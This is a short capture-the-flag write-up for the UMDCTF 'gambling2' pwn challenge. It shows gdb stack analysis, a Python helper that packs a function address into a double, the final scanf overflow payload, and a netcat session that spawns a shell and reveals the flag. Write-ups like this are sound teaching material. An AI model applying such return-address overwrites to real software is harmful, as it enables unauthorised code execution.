# pwn/gambling2 – quick write-up

## 1 . Recon  
``gdb ./gambling``  
- `disassemble gamble` shows `scanf("%lf …%lf",f,f+6)` but `float f[4]` – classic **stack-overflow**.  
- At the first breakpoint (`0x80492e0`) examine the stack:

``info registers`` ⇒ `esp = …730`  
``x/40wx $esp`` after `scanf` shows  

```
esp+0x40 = f[0]
esp+0x5c = saved EIP
```  

Difference = **0x5c – 0x40 = 0x1c = 28 bytes**  
→ the **7-th** `%lf` (6 * 4 B stride) lands on the return address.

---

## 2 . Target address  
`print_money()` = **0x080492c0** (from symbols / gdb).

---

## 3 . Packing address into a double  
Python helper:

    import struct
    hi = 0x080492c0
    lo = 0x41414141          # padding
    dbl = struct.unpack('<d', struct.pack('<Q', (hi<<32)|lo))[0]
    print(dbl)               # 4.8678447495872505e-270

Any IEEE-754 bit pattern is legal, so `scanf` will copy the raw bytes as-is.

---

## 4 . Final payload  

```
0 0 0 0 0 0 4.8678447495872505e-270
```

Seven numbers → 6 benign doubles + the crafted one.

---

## 5 . Winning

```
$ nc challs.umdctf.io 31005
Enter your lucky numbers: 0 0 0 0 0 0 4.8678447495872505e-270
Aww dang it!
cat flag.txt
UMDCTF{99_percent_of_pwners_quit_before_they_get_a_shell_congrats_on_being_the_1_percent}
```

`Aww dang it!` prints *before* the function returns; immediately afterwards execution jumps to `print_money`, spawning `/bin/sh` and revealing the flag.